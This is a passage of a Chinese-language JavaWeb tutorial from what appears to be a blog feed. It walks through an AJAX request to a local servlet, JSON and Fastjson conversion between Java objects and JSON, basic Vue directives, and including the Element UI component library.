class="language-javascript">    <span class="hljs-comment">// 创建 XMLHttpRequest 对象</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> xhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript"></span><br><span class="language-javascript">    xhttp.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">readyState</span>  == <span class="hljs-number">4</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 定义回调函数</span></span><br><span class="language-javascript">    xhttp.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// 您可以在这里使用数据</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 发送请求</span></span><br><span class="language-javascript">    xhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://localhost:8080//ajaxServlet&quot;</span>);</span><br><span class="language-javascript">    xhttp.<span class="hljs-title function_">send</span>();</span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="十一、JSON"><a href="#十一、JSON" class="headerlink" title="十一、JSON"></a>十一、JSON</h2><p>概念：JavaScript Object Notation。JavaScript 对象表示法</p><p>由于其语法简单，层次结构鲜明，现多用于作为数据载体，在网络中进行数据传输</p><h3 id="1、JSON概览与定义"><a href="#1、JSON概览与定义" class="headerlink" title="1、JSON概览与定义"></a>1、JSON概览与定义</h3><p><img src="/img/JavaWeb/1-2/JSON1.png"></p><p>简单定义：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> json = &#123;</span><br><span class="language-javascript">    <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;zhangsan&quot;</span>,</span><br><span class="language-javascript">    <span class="hljs-string">&quot;age&quot;</span> : <span class="hljs-number">18</span>,</span><br><span class="language-javascript">    <span class="hljs-string">&quot;adde&quot;</span> : [<span class="hljs-string">&quot;beijing&quot;</span>,<span class="hljs-string">&quot;shanghai&quot;</span>,<span class="hljs-string">&quot;guangzhou&quot;</span>]</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2、JSON和Java对象的相互转化"><a href="#2、JSON和Java对象的相互转化" class="headerlink" title="2、JSON和Java对象的相互转化"></a>2、JSON和Java对象的相互转化</h3><p>Fastjson是阿里巴巴提供的一个 Java 语言编写的高性能功能完善的 JSON 库 ， 是目前 Java 语言中最快的 JSON库，可以实现 Java 对象和 JSON 字符串的相互转换。</p><p>1、导入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.83<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2、Java对象与JSON对象转化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.penn.JSON;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JSONDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//1.Java对象存入JSON对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setId(<span class="hljs-number">1</span>);<br>        user.setName(<span class="hljs-string">&quot;张三&quot;</span>);<br>        user.setPassword(<span class="hljs-string">&quot;123456&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> JSON.toJSONString(user);<br>        System.out.println(s);<br><br>        <span class="hljs-comment">//2.JSON对象存入Java对象</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject1</span> <span class="hljs-operator">=</span> JSON.parseObject(s);<br>        System.out.println(jsonObject1);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject2</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;id\&quot;:1,\&quot;name\&quot;:\&quot;张三\&quot;,\&quot;password\&quot;:\&quot;123456\&quot;&#125;&quot;</span>);<br>        System.out.println(jsonObject2);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="十二、Vue"><a href="#十二、Vue" class="headerlink" title="十二、Vue"></a>十二、Vue</h2><p>Vue 是一套前端框架，免除原生 JavaScript 中的DOM操作，简化书写</p><p>基于 MVVM（ModeI-View-ViewModel）思想，实现数据的双向绑定，将编程的关注点放在数据上</p><p>官网：<a href="https://cn.vuejs.org/">https://cn.vuejs.org</a></p><p><img src="/img/JavaWeb/1-2/Vue1.png"></p><h3 id="1、入门-1"><a href="#1、入门-1" class="headerlink" title="1、入门"></a>1、入门</h3><p><img src="/img/JavaWeb/1-2/Vue2.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!--编辑视图--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--插值表达式--&gt;</span><br>    &#123;&#123;username&#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!--引入vue.js--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//1.创建Vue实例</span></span><br><span class="language-javascript">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">username</span>:<span class="hljs-string">&quot;&quot;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript">    <span class="hljs-comment">//与上面代码等价</span></span><br><span class="language-javascript">    <span class="hljs-comment">// new Vue(&#123;</span></span><br><span class="language-javascript">    <span class="hljs-comment">//     data: function()&#123;</span></span><br><span class="language-javascript">    <span class="hljs-comment">//         return &#123;</span></span><br><span class="language-javascript">    <span class="hljs-comment">//            username : &quot;&quot;</span></span><br><span class="language-javascript">    <span class="hljs-comment">//         &#125;</span></span><br><span class="language-javascript">    <span class="hljs-comment">//     &#125;</span></span><br><span class="language-javascript">    <span class="hljs-comment">// &#125;);</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2、常用指令"><a href="#2、常用指令" class="headerlink" title="2、常用指令"></a>2、常用指令</h3><p><img src="/img/JavaWeb/1-2/Vue3.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><p><img src="/img/JavaWeb/1-2/Vue4.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;一个按钮&quot;</span> <span class="hljs-attr">v-on:click</span>=<span class="hljs-string">&quot;show()&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;一个按钮&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;show()&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//1. 创建Vue核心对象</span></span><br><span class="language-javascript">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">username</span>:<span class="hljs-string">&quot;&quot;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">url</span>:<span class="hljs-string">&quot;https://www.baidu.com&quot;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">show</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;我被点了...&quot;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/JavaWeb/1-2/Vue5.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;count == 3&quot;</span>&gt;</span>div1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-else-if</span>=<span class="hljs-string">&quot;count == 4&quot;</span>&gt;</span>div2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-else</span>&gt;</span>div3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;count == 3&quot;</span>&gt;</span>div v-show<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;count&quot;</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 用条件控制其div是否显示 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">//1. 创建Vue核心对象</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">count</span>:<span class="hljs-number">3</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/JavaWeb/1-2/Vue6.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;addr in addrs&quot;</span>&gt;</span><br>    &#123;&#123;addr&#125;&#125; <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 生成多个div盒子 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(addr,i) in addrs&quot;</span>&gt;</span><br>    &#123;&#123;i+1&#125;&#125;--&#123;&#123;addr&#125;&#125; <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">//1. 创建Vue核心对象</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">addrs</span>:[<span class="hljs-string">&quot;北京&quot;</span>,<span class="hljs-string">&quot;上海&quot;</span>,<span class="hljs-string">&quot;西安&quot;</span>]</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3、生命周期"><a href="#3、生命周期" class="headerlink" title="3、生命周期"></a>3、生命周期</h3><p><img src="/img/JavaWeb/1-2/Vue7.png"></p><h2 id="十三、Element"><a href="#十三、Element" class="headerlink" title="十三、Element"></a>十三、Element</h2><p>EIement：是饿了么公司前端开发团队提供的一套基于 Vue 的网站组件库，用于快速构建网页</p><p>组件：组成网页的部件例如超链接、按钮、图片、表格等等</p><p>官网：<a href="https://element.eleme.cn/#/zh-CN">https://element.eleme.cn/#/zh-CN</a></p><h3 id="1、入门-2"><a href="#1、入门-2" class="headerlink" title="1、入门"></a>1、入门</h3><p>1.引入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;element-ui/lib/index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;element-ui/lib/theme-chalk/index.css&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2.创建Vue核心对象</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript"><span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span></span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3.官网查看相关需要的内容，应用并修改</p><p><img src="/img/JavaWeb/1-2/Element1.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb基础1-1</title>
    <link href="/2023/05/16/JavaWeb_1_1/"/>
    <url>/2023/05/16/JavaWeb_1_1/</url>
    
